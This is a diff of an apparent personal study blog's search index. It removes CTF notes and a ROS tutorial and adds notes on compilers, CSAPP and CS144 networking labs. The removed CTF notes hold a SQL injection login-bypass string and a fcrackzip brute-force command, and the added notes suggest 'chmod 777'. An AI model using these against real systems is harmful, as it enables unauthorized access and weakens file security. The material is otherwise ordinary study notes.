@@ -1,828 +1,174 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Broken Knowledge</title>
-    <url>/2022/01/30/CTF-Broken%20knowledge/</url>
-    <content><![CDATA[<p>LINUX图形界面转化成命令行界面：<code>ctrl+alt+f2</code>.</p>
-<p>Crypto是用写代码解决的CTF问题.</p>
-<p>虚拟机与实体机共享文件：按照<u>官方教程</u>安装VMtools后直接拖入（kali已经可以了，ubuntu好像还不行）.</p>
-<p>base64编码：<a href="https://zhuanlan.zhihu.com/p/339477329">https://zhuanlan.zhihu.com/p/339477329</a>.</p>
-<p>上位机：可以直接发出操控命令的计算机.</p>
-<p>LINUX切换成root用户：sudo -i</p>
-<img src="D:\CTF\notes' pictures\转换成root用户.png" alt="转换成root用户" style="zoom:90%;" />
+    <title>CS143 Compiler</title>
+    <url>/2022/11/16/CS143%20Compiler/</url>
+    <content><![CDATA[<h4 id="0x00-Overview"><a href="#0x00-Overview" class="headerlink" title="0x00 Overview"></a>0x00 Overview</h4><ul>
+<li><strong>lexical analyzer:</strong> also called a scanner, using a lexical analyzer generator called flex.</li>
+<li></li>
+</ul>
+<h4 id="0x01-lexical-analyzer"><a href="#0x01-lexical-analyzer" class="headerlink" title="0x01 lexical analyzer"></a>0x01 lexical analyzer</h4>]]></content>
+  </entry>
+  <entry>
+    <title>CSAPP阅读笔记</title>
+    <url>/2022/11/12/CSAPP%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h4 id="Chapter1-计算机系统漫游"><a href="#Chapter1-计算机系统漫游" class="headerlink" title="Chapter1 计算机系统漫游"></a>Chapter1 计算机系统漫游</h4><ul>
+<li><p>编译系统</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\编译系统.png" alt="编译系统" style="zoom:67%;" />
 
-<p>LINUX终端下复制粘贴：复制命令:Ctrl + Shift + C，粘贴命令:Ctrl + Shift + V.</p>
-<p>图片隐写（image stegano）：将图片下载，并将其重命名为.txt文件，打开就可以获得密码.</p>
-<p>凯撒密码：位移不是固定的.</p>
-<p>Robots_exclusion_standard：如<a href="http://www.wechall.net/robots.txt%EF%BC%8C%E8%AF%A5">http://www.wechall.net/robots.txt，该</a> robots.txt 文件被网络爬虫用来检查他们是否被允许对你的网站或其中一部分进行爬网和索引。有时，这些文件会显示目录结构，而非保护内容不被爬网.</p>
-<p>LFI漏洞：本地文件包含（Local File Include)是PHP脚本的一大特色。程序员经常把一系列功能函数都写进function.php中（包含），之后当某个文件需要时再进行调用。</p>
+<ul>
+<li><p>预处理阶段：根据#开头的命令，插入头文件。</p>
 <blockquote>
-<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4></blockquote>
-<p>SELECT * FROM user WHERE username=’ <font color=#00BFFF>admin‘ or ‘1‘=‘1</font> ‘ AND password=’ ‘（以用户名admin登录）</p>
-<p>用户名填  ‘ or 1=1#   闭合查询语句</p>
-<p>一个二维码识别网站：<a href="https://online-barcode-reader.inliteresearch.com/">barcode online reader</a>.🦓真的可以扫二维码！今天做了一道题，题解就是扫斑马身上的二维码。</p>
-<p>一个计算网站：<a href="https://www.wolframalpha.com/">Wolfram|Alpha: Computational Intelligence</a></p>
+<p>hello.c：源程序（文本），由0和1组成的位（bit）序列。8个位为一个字节，每个字节表示程序中某个文本字符（ASCII标准）。</p>
+</blockquote>
+</li>
+<li><p> 编译阶段：编译器输出汇编语言文件。</p>
+</li>
+<li><p>汇编阶段：汇编器将.s文件翻译成机器语言指令。</p>
+</li>
+<li><p>链接阶段：合并一些编译器提供的标准库中的函数。</p>
 <blockquote>
-<h4 id="代换密码与转置密码"><a href="#代换密码与转置密码" class="headerlink" title="代换密码与转置密码"></a>代换密码与转置密码</h4></blockquote>
-<p>一、代换（substitution）密码（摘自<a href="https://www.jianshu.com/p/c40f45d0d44b%EF%BC%89">https://www.jianshu.com/p/c40f45d0d44b）</a></p>
-<p>采用一一映射的方式，将明文每个字符逐一唯一地代换成另外的一个字符。在凯撒密码中，每个字母都按照其在字母表中的顺序向后（或向前）移动固定数目（循环移动）作为密文。而代换密码则不是简单的按顺序移位，而是完全混乱的毫无规律地进行映射。</p>
-<p><strong>攻击：</strong>凯撒就是简单的字母的移位，仅仅有25种可能的密钥，暴力穷举法可以瞬间攻破它。代换密码则没法简单地看出字符的对应关系了，其可能的密钥可达26!个。</p>
-<p>对于代换密码，有多种的常用的攻击方法，其中常见两种为“词频分析法”和“爬山法”。</p>
-<p><strong>词频分析法</strong>:把密文中字母使用的相对频率统计出来，与日常英语中英文字母使用的相对频率进行比较，利用频率进行匹配，即密文中频率较高的字母对应于日常英语中使用频率较高的英文字母。由于要使用到数学统计的方法，此攻击方法需要用到较长的密文。可<a href="https://link.jianshu.com/?t=https://quipqiup.com/">点击这里</a>进行线上解密。</p>
-<p><strong>爬山法</strong>：选择性地尝试不同解密密钥，然后给每一个解密出来的明文标记上一个适应度。解密出来的明文越接近我们的日常用的英语，适应度就越高；解密出来的明文越难读懂或者越不像我们日常用的英语，则其适应度越低。我们使用一个基于quadgram statistics的适应度计算方法。</p>
-<p>下面详细描述算法步骤：</p>
-<p>（1）随机生成一个key，称为parentkey，用它解密得对应的明文m1，对明文计算适应度d1。</p>
-<p>（2）随机交换parentkey中的两个字符得到子密钥child，解密出对应的明文m2并计算适应度d2。</p>
-<p>（3）若d1&lt;d2，则child成为新的parentkey</p>
-<p>（4）不断循环进行（2）（3）直到最后的1000次循环中不再有更高的适应度生成</p>
-<p>（5）回到（1）重新生成parentkey继续迭代寻找，或者由操作者终止程序</p>
-<p>  重新执行（1），是为了防止（2）（3）的操作使结果陷入局部最优的困境。对于生成的明文的适应度的比较，其实可以看作是对不同解密密钥的比较，解密出来的明文的适应度越高，对应的密钥就更好。</p>
-<p>quadgrams.txt和ngram_score.py可<a href="https://link.jianshu.com/?t=http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/">点击这里</a>获取。</p>
-<p>二、错位（Transposition）密码</p>
-<p>错位密码是一种使<strong>明文单元的位置（</strong>“单元”通常是字符或者字符串）通过一种有规律的方式进行移动的加密方法，生成的密文构成明文的一个置换。 也即明文被重新排序了。更难被攻击。</p>
+<p>执行：shell是个命令行解释器，输出一个提示符，等待输入一个命令行，然后执行该命令。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>系统的硬件组成</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\系统硬件组成.png" alt="系统硬件组成" style="zoom:67%;" />
+
+<ul>
+<li><p> 总线：传送定长字（word），字长是一个基本的系统参数。</p>
+</li>
+<li><p>I/O设备：示例系统包括4个I/O设备：键盘、鼠标、显示器、磁盘。每个I/O设备都通过一个控制器或适配器与I/O总线相连。</p>
+<blockquote>
+<p>控制器和适配器：主要区别在于封装方式。控制器是置于I/O设备本身的或系统的主板上的芯片组，而适配器则是一块插在主板插槽上的卡。</p>
+</blockquote>
+</li>
+<li><p>主存：执行程序时临时存储程序和数据。物理上看，由一组动态随机存取存储器（DRAM）芯片组成；逻辑上看，是一个线性字节数组，每个字节有其唯一的地址（数组索引）。</p>
+</li>
+<li><p>处理器：中央处理单元（CPU），用于解释（或执行）存储在主存中的指令。核心是<strong>程序计数器（PC）</strong>，PC指向主存中的某条指令地址，处理器不断执行PC指向的指令。<strong>寄存器文件（register file）</strong>是一个小的存储设备，由一些1字长的寄存器组成。<strong>算术/逻辑单元（ALU）</strong>计算新的数据和地址值。</p>
+<ul>
+<li> 加载：主存 → 寄存器；</li>
+<li> 存储：寄存器 → 主存；</li>
+<li> 操作：两个寄存器 → ALU → 一个寄存器；</li>
+<li> 跳转：指令 → PC。</li>
+</ul>
+<blockquote>
+<p>指令集结构描述的是每条机器代码指令的效果；微体系结构描述的是处理器实际上是如何实现的。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>高速缓存</p>
+</li>
+</ul>
+<p>高速缓存存储器存放近期可能用到的信息以应对处理器和主存之间的差异。L1和L2高速缓存用一种叫做静态随机访问存储器（SRAM）的硬件技术实现的。</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\存储器层次结构.png" alt="存储器层次结构" style="zoom:67%;" />
+
+<ul>
+<li>操作系统</li>
+</ul>
+<p>所有应用程序对硬件的操作尝试都必须通过OS。抽象表示部分将在操作系统课程中详细学习，详细看书。</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\OS CSAPP.png" alt="OS CSAPP" style="zoom:67%;" />
+
+
+
+<h4 id="Chapter-2-信息的表示和处理"><a href="#Chapter-2-信息的表示和处理" class="headerlink" title="Chapter 2 信息的表示和处理"></a>Chapter 2 信息的表示和处理</h4><ul>
+<li><p>信息存储</p>
+<blockquote>
+<p>指针：值表示某个对象的位置，类型表示那个位置上所存储对象的类型。</p>
+</blockquote>
+<ul>
+<li><p>字：计算机的字长决定虚拟地址空间的最大大小。一个字长微w微的机器，虚拟地址范围为0~2。不同位机器分配给数据类型的字节数不同。</p>
+</li>
+<li><p>寻址和字节顺序</p>
+<ul>
+<li><p>小端法：最低有效字节在前，大多Intel兼容机采用；大端法：最高有效字节在前，大多IBM和Sun机器采用。（0x01234567 - 0是高位字节）</p>
+<blockquote>
+<p>x的地址为0x100，也即地址表达式&amp;x的值为0x100。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 ]]></content>
   </entry>
   <entry>
-    <title>Misc</title>
-    <url>/2022/02/12/Misc/</url>
-    <content><![CDATA[<blockquote>
-<h4 id="二维码-扫描、分离隐藏文件，暴力破解压缩包"><a href="#二维码-扫描、分离隐藏文件，暴力破解压缩包" class="headerlink" title="二维码 - 扫描、分离隐藏文件，暴力破解压缩包"></a>二维码 - 扫描、分离隐藏文件，暴力破解压缩包</h4></blockquote>
-<p>①<strong>binwalk扫描文件</strong>：发现隐藏文件，藏了一个压缩包<strong>在图片中</strong>。</p>
-<img src="D:\CTF\notes' pictures\binwalkQR.png" alt="binwalkQR" style="zoom:70%;" />
-
-
-
-<p>②<strong>分离隐藏文件</strong>：四种方法<a href="https://www.cnblogs.com/jiaxinguoguo/p/7351202.html">https://www.cnblogs.com/jiaxinguoguo/p/7351202.html</a></p>
-<p>（1）<strong>dd命令</strong>分离隐藏文件：<code>dd if=QR_code.png of=flag1.zip skip=471 bs=1</code> </p>
-<p>​    ※bs为其他值会报错“无法跳至指定偏移量”，且文件不正常。</p>
-<ul>
-<li><p><strong>LINUX dd命令：</strong></p>
-<p>dd命令主要用来块拷贝一个指定大小的文件，并在拷贝的同时进行指定的转换。<u>参数注释：</u></p>
-<p>1.if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;</p>
-<p>2.of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;</p>
-<p>3.skip=blocks：从输入文件开头跳过blocks个块后再开始复制。</p>
-<p>4.bs=bytes：设置读入/输出的块大小为bytes个字节。</p>
-<p>……可以灵活使用参数进行<u>磁盘测试</u>etc.</p>
-</li>
-</ul>
-<img src="D:\CTF\notes' pictures\binwalk更改skip.png" alt="binwalk更改skip" style="zoom:67%;" />
-
-<p>（2）也可在<font color=#00BFFF>一定环境配置(java)下</font>使用**<code>binwalk -e</code>**来分离文件。</p>
-<img src="D:\CTF\notes' pictures\binwalk -e报错.png" alt="binwalk -e报错" style="zoom:70%;" />
-
-
-
-<p>③破解压缩包密码</p>
-<p>（1）<strong>fcrackzip</strong>暴力破解<strong>zip</strong>压缩包密码：下载安装<code>sudo apt-get install fcrackzip</code>，命令<code>fcrackzip -b -c1 -l 1-4 -u /home/vivi/flag1.zip</code></p>
-<ul>
-<li>参数解释：-b 暴力破解模式，-c 指定掩码类型（a=a-z; 1=0-9; !=特殊字符），-l 密码长度，-u 压缩文件名</li>
-</ul>
-<p>※只能破解zip，rar就不行了。</p>
-<p>（2）<strong>rar</strong>用<strong>ARCHPR</strong>：注意设置攻击类型、范围与掩码。</p>
-<ul>
-<li><font color=#00BFFF>攻击类型</font></li>
-</ul>
-<blockquote>
-<h4 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h4></blockquote>
-<p>1.万能的txt读程序源码</p>
-<p>2.用html加载图片</p>
-<img src="D:\CTF\notes' pictures\html加载图片.png" alt="html加载图片" style="zoom:67%;" />
-
-
-
-<blockquote>
-<h4 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h4></blockquote>
-<p>图片属性中也能藏信息</p>
-<blockquote>
-<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><font color=#00BFFF>wireshark</font></h4></blockquote>
-<p>wireshark&amp;被嗅探的流量两题，不知道wireshark怎么用。</p>
-<blockquote>
-<h4 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h4></blockquote>
-<p>只可在无损压缩或者无压缩的图片（.bmp）上实现lsb隐写。</p>
-<p>.jpg：对像数进行了<strong>有损</strong>压缩，<strong>无法用LSB隐写</strong>。</p>
-<p>.bmp：把所有的像数都按原样储存，一般特别大，<strong>没有进行压缩</strong>。可LSB隐写。</p>
-<p>.png：一种<strong>无损</strong>压缩的位图片形格式。可LSB隐写。</p>
-<p>图像像数一般由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即共有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的大约6777216种颜色。</p>
-<img src="D:\CTF\notes' pictures\RGB.png" alt="RGB" style="zoom:50%;" />
-
-<p>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带<strong>3比特</strong>的信息。</p>
-<img src="D:\CTF\notes' pictures\最低有效位.png" alt="最低有效位" style="zoom: 35%;" />
-
-<p>图片通道：一幅完整的图像，红色绿色蓝色三个通道缺一不可。</p>
-<blockquote>
-<p>（PhotoShop中）关闭红色通道，图像偏青色；关闭绿色通道，图像偏红色；关闭蓝色通道，图像偏黄色；Alpha通道是一个8位的灰度通道，也可理解为透明度。</p>
-</blockquote>
-<p>配置java环境后用<strong>Stegsolve</strong>打开LSB隐写的图片，查看<code>Red plane 0</code>、<code>Grenn plane 0</code>、<code>Blue plane0</code>通道上方有东西，调整保存DataAnalyse数据生成图片。</p>
-<img src="D:\CTF\notes' pictures\Stegsolve_BluePlane0.png" alt="Stegsolve_BluePlane0" style="zoom:50%;" />
-
-<img src="D:\CTF\notes' pictures\StegsolveDataExtract.png" alt="StegsolveDataExtract" style="zoom:55%;" />
-
-
-
-<blockquote>
-<h4 id="zip伪加密-十六进制编辑器"><a href="#zip伪加密-十六进制编辑器" class="headerlink" title="zip伪加密 - 十六进制编辑器"></a>zip伪加密 - 十六进制编辑器</h4></blockquote>
-<p>010editor template下载相关插件，修改参数。</p>
-<p>zip伪加密：不需要真的解密，修改相应参数后再打开就不用密码了。一般在压缩源文件数据区全局方式位标记处，真加密为 09 00，伪加密为00 00，而这道题把两处标记全改过了，所以应当改两处。</p>
-<img src="D:\CTF\notes' pictures\伪加密标记位.png" alt="伪加密标记位" style="zoom:70%;" />
-
-<img src="D:\CTF\notes' pictures\010editor改参数.png" alt="010editor改参数" style="zoom:65%;" />
-
-
-
-<blockquote>
-<h4 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h4></blockquote>
-<p>二进制八个一组转ASCII码</p>
-<blockquote>
-<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4></blockquote>
-<p>.png中隐藏.zlib文件。</p>
-<p>※**.zlib文件**：用于数据压缩的开源软件包。</p>
-<p>Stegsolve打开图片，Data Analyse按上LSB加密设置（MSB也可）（主要是查看隐写）调出数据，看到文件头为504B0304（zip和zlib文件头一样）。各类型file的文件头尾：<a href="http://www.mamicode.com/info-detail-2468733.html%E3%80%82">http://www.mamicode.com/info-detail-2468733.html。</a></p>
-<p>不用Windows自带的压缩器打开压缩包后看到一个无后缀的ELF文件。在其中查找“hctf”。</p>
-<p>※<strong>ELF文件</strong>：一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。是UNIX系统实验室（USL）作为应用程序二进制接口而开发和发布的，也是Linux的主要可执行文件格式。</p>
-<blockquote>
-<h4 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h4></blockquote>
-<p>用Audacity处理摩斯电码：200宽度的表示_ 50宽度的表示 . 距离50宽度的连读 50宽度外的表示停顿。</p>
-<p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
-<blockquote>
-<h4 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h4></blockquote>
-<p>brainfuck（一种计算机语言）加密。<a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a></p>
-<blockquote>
-<h4 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h4></blockquote>
-<p>解压后用D盾。</p>
-<p><strong>后门</strong>：指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。有攻击者建立的后门，也有程序员自己在软件内创建后门以方便测试或者修改程序中的缺陷。后者在软件发布时，后门被有意或者无意忽视了，没有被删除，那么这个软件天生就存在后门，安装该软件的主机就不可避免的引入了后门。</p>
-<blockquote>
-<h4 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h4></blockquote>
-<p>.bin 文件是一个路由配置文件，路由器信息数据，一般包含账号密码。</p>
-<p>用<font color=#00BFFF>RouterPassView</font></p>
-<blockquote>
-<h4 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h4></blockquote>
-<p>binwalk分离出压缩包，010editor修改伪加密（不修改伪加密linux上打不开压缩包，看不到vmdk文件），再在linux里解压vmdk文件（windows解不了压，linux里解压才能看到txt文件）</p>
-<p><strong>vmdk文件</strong>：VMDK是虚拟机VMware创建的虚拟硬盘格式，文件存在于VMware文件系统中，被称为VMFS（虚拟机文件系统）。一个VMDK文件代表VMFS在虚拟机上的一个物理硬盘驱动。所有用户数据和有关虚拟服务器的配置信息都存储在VMDK文件中。</p>
-<blockquote>
-<h4 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h4></blockquote>
+    <title>CS144 Lab 1</title>
+    <url>/2022/11/02/CS144%20Lab%201/</url>
+    <content><![CDATA[<p>实验指导书：<a href="https://cs144.github.io/assignments/lab1.pdf">Lab Checkpoint 1: stitching substrings into a byte stream</a></p>
 ]]></content>
   </entry>
   <entry>
-    <title>ROS</title>
-    <url>/2022/06/23/ROS/</url>
-    <content><![CDATA[<p>☁参考：<a href="http://www.autolabor.com.cn/book/ROSTutorials/">Autolabor-赵虚左</a>  <a href="http://wiki.ros.org/cn/ROS/Tutorials">ROS手册</a></p>
-<p>最初是为后来没去的暑假实习硬件岗位学的ROS，这东西蛮有趣、蛮好上手（比起二进制安全（根本原因是我自学能力差））的。学都学了，干脆多学一点。</p>
-<h4 id="0x00-安装ROS"><a href="#0x00-安装ROS" class="headerlink" title="0x00 安装ROS"></a>0x00 安装ROS</h4><p>按照1.2.4 安装ROS没有遇到问题，测试成功。</p>
-<p><img src="D:\blog\coriiiander\source_posts\pictures\测试ROS.png" alt="测试ROS"></p>
-<h4 id="0x01-HelloWorld简单实现"><a href="#0x01-HelloWorld简单实现" class="headerlink" title="0x01 HelloWorld简单实现"></a>0x01 HelloWorld简单实现</h4><p><strong>vscode图形界面下总结</strong>：/DEMO/src → 右击Create Catkin Package → 输入包名和依赖包 → 包下src中创建c文件 → 修改CMakeLists文件 → catkin_make:debug终端下编译 → 0x01 5 执行</p>
-<p>​    python在功能包下新建scripts文件夹 → 创建c文件 → …</p>
-<h5 id="1-创建工作空间"><a href="#1-创建工作空间" class="headerlink" title="1.创建工作空间"></a>1.创建工作空间</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p 自定义空间名称/src</span><br><span class="line">cd 自定义空间名称</span><br><span class="line">catkin_make //ROS编译命令</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="2-创建功能包"><a href="#2-创建功能包" class="headerlink" title="2.创建功能包"></a>2.创建功能包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//进入 src 创建 ros 包并添加依赖</span><br><span class="line">cd src</span><br><span class="line">catkin_create_pkg 自定义ROS包名 roscpp rospy std_msgs</span><br></pre></td></tr></table></figure>
-
-<p>该功能包依赖于 roscpp、rospy 与 std_msgs，其中roscpp是使用C++实现的库，而rospy则是使用python实现的库，std_msgs是标准消息库。</p>
-<blockquote>
-<p>ubuntu20.04 创建文件：<code>sudo gedit 文件名</code></p>
-<p>ubuntu20.04 输入中文：<a href="https://blog.csdn.net/u013819452/article/details/125324881">https://blog.csdn.net/u013819452/article/details/125324881</a></p>
+    <title>CS144 Lab 0</title>
+    <url>/2022/10/24/CS144%20Lab%200/</url>
+    <content><![CDATA[<p>实验指导书：<a href="https://cs144.github.io/assignments/lab0.pdf">Lab Checkpoint 0: networking warmup</a></p>
+<p>环境搭建：<a href="https://stanford.edu/class/cs144/vm_howto/vm-howto-image.html#download">Setting up your CS144 VM using VirtualBox</a></p>
+<h4 id="1-Networking-by-hand"><a href="#1-Networking-by-hand" class="headerlink" title="1 Networking by hand"></a>1 Networking by hand</h4><h5 id="1-1-Fetch-a-Web-page"><a href="#1-1-Fetch-a-Web-page" class="headerlink" title="1.1 Fetch a Web page"></a>1.1 Fetch a Web page</h5><blockquote>
+<p>computer’s name - IP, service’s name - TCP port number</p>
 </blockquote>
-<h5 id="3-编辑源文件"><a href="#3-编辑源文件" class="headerlink" title="3.编辑源文件"></a>3.编辑源文件</h5><p><strong>C++版</strong></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* demo01/src/helloworld/src */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.包含 ros 的头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ros/ros.h&quot;</span></span></span><br><span class="line"><span class="comment">//2.编写main函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="comment">//执行 ros 节点初始化</span></span><br><span class="line">    ros::<span class="built_in">init</span>(argc,argv,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="comment">//创建 ros 节点句柄(非必须)</span></span><br><span class="line">    ros::NodeHandle n;</span><br><span class="line">    <span class="comment">//控制台输出 hello world</span></span><br><span class="line">    <span class="built_in">ROS_INFO</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>telnet cs144.keithw.org http</code>连接远程网页服务器</p>
+<blockquote>
+<p><strong>telnet</strong> program open a reliable byte stream between your computer and another computer with a particular service running on that computer - http.</p>
+</blockquote>
+<p>之后再键入以下内容</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">GET /hello HTTP/<span class="number">1.1</span><span class="symbol">&lt;enter&gt;</span></span><br><span class="line">Host: cs144.keithw.org<span class="symbol">&lt;enter&gt;</span></span><br><span class="line">Connection: <span class="keyword">close</span><span class="symbol">&lt;enter&gt;</span></span><br><span class="line"><span class="symbol">&lt;enter&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>python版</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">##指定解释器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.导包</span></span><br><span class="line"><span class="keyword">import</span> rospy</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.编写主入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#3.初始化 ROS 节点</span></span><br><span class="line">    rospy.init_node(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">    <span class="comment">#4.输出日志</span></span><br><span class="line">    rospy.loginfo(<span class="string">&quot;Hello World!!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+<img src="D:\blog\coriiiander\source\_posts\pictures\cs144_1.png" alt="cs144_1" style="zoom:80%;" />
 
+
+
+<h5 id="1-2-Listening-and-connecting"><a href="#1-2-Listening-and-connecting" class="headerlink" title="1.2 Listening and connecting"></a>1.2 Listening and connecting</h5><p>telnet as client, netcat as server</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\cs144_2.png" alt="cs144_2" style="zoom:67%;" />
+
+
+
+<h4 id="2-Writing-a-network-program-using-an-OS-stream-socket"><a href="#2-Writing-a-network-program-using-an-OS-stream-socket" class="headerlink" title="2 Writing a network program using an OS stream socket"></a>2 Writing a network program using an OS stream socket</h4><h5 id="2-0-参考文档阅读"><a href="#2-0-参考文档阅读" class="headerlink" title="2.0 参考文档阅读"></a>2.0 参考文档阅读</h5><p>参考文档： <a href="https://cs144.github.io/doc/lab0/">Sponge documentation </a> FileDescriptor, Socket, TCPSocket, Address classes部分；file descriptor.hh, socket.hh, address.hh头文件。</p>
 <ul>
-<li><p>为 python 文件添加可执行权限 <code>chmod +x 自定义文件名.py</code></p>
+<li><p>FileDescriptor</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\FileDescriptor.png" alt="FileDescriptor" style="zoom:85%;" /></li>
+</ul>
+<h5 id="2-1-building-the-starter-code"><a href="#2-1-building-the-starter-code" class="headerlink" title="2.1 building the starter code"></a>2.1 building the starter code</h5><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/cs144/sponge</span><br><span class="line">cd sponge</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake .. <span class="comment"># 在该目录下生成makefile文件</span></span><br><span class="line">make <span class="comment"># 编译 &quot;make -j4&quot; use four processors</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>自定义文件名为*，表示所有文件；ll命令查看文件属性：可读r，可写w，可执行x 。</p>
+<p>make：任意一个 C++ 程序都可以用 g++ 来编译，但当程序规模较大时，使用 g++ 将输入大量的编译指令。可用 makefile 进行自动编译。直接用 cmake 命令生成 makefile 文件，再用 make命令根据 makefile 文件的内容，编译整个工程更加方便。</p>
 </blockquote>
+<ul>
+<li>git clone 报错<code>gnutls_handshake() failed: Error in the pull function.</code> 解决方法：root下运行<code>apt-get -y install build-essential nghttp2 libnghttp2-dev libssl-dev</code>。</li>
+<li>VScode远程连接虚拟机进行开发问题<ul>
+<li><a href="https://blog.csdn.net/yylxiaobai/article/details/120024829">ssh连接</a></li>
+<li>permission denied: <code>sudo chmod 777 路径</code></li>
+<li>找不到头文件：<code>#include &quot;socket.hh&quot;</code> 添加路径修改为 <code>#include &quot;/home/cs144/sponge/libsponge/util/socket.hh&quot;</code></li>
+</ul>
 </li>
 </ul>
-<h5 id="4-编辑配置文件"><a href="#4-编辑配置文件" class="headerlink" title="4.编辑配置文件"></a>4.编辑配置文件</h5><p><strong>C++版</strong></p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">add_executable(步骤3的源文件名(也可以随便起一个名字)</span><br><span class="line">  src/步骤3的源文件名.cpp</span><br><span class="line">)</span><br><span class="line">target_link_libraries(步骤3的源文件名</span><br><span class="line">  $&#123;catkin_LIBRARIES&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><strong>python版</strong></p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为Python配置合适的解释器 1.安装 2.定位解释器</span></span><br><span class="line"><span class="comment"># 未配置CMakeList.txt是解决方法：1.直接声明解释器为python3（不建议） 2.通过软链接将 python 链接到 python3（建议）</span></span><br><span class="line">catkin_install_python(PROGRAMS scripts/自定义文件名.py</span><br><span class="line">  DESTINATION $&#123;CATKIN_PACKAGE_BIN_DESTINATION&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="5-编译并执行"><a href="#5-编译并执行" class="headerlink" title="5.编译并执行"></a>5.编译并执行</h5><p><strong>C++版</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 自定义空间名称</span><br><span class="line">catkin_make（也可在vscode下catkin_make:debug终端下ctrl + shift + b编译）</span><br><span class="line">:~$ roscore（根目录）</span><br><span class="line">cd 工作空间</span><br><span class="line">source ./devel/setup.bash //将当前工作空间刷新到当前窗口下的环境变量</span><br><span class="line">rosrun 包名 C++节点(步骤3的源文件名/配置文件中随便起的名字)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>当前工作空间外执行：</strong><code>source ~/工作空间/devel/setup.bash</code>添加进<code>.bashrc</code>文件（参考安装ROS时配置环境变量，方便在任意终端中使用 ROS）</p>
-<ul>
-<li><p><strong>添加方式1</strong>: 直接使用 gedit 或 vi 编辑 .bashrc 文件，最后添加该内容</p>
-</li>
-<li><p><strong>添加方式2</strong>:<code>echo &quot;source ~/工作空间/devel/setup.bash&quot; &gt;&gt; ~/.bashrc</code></p>
-</li>
-</ul>
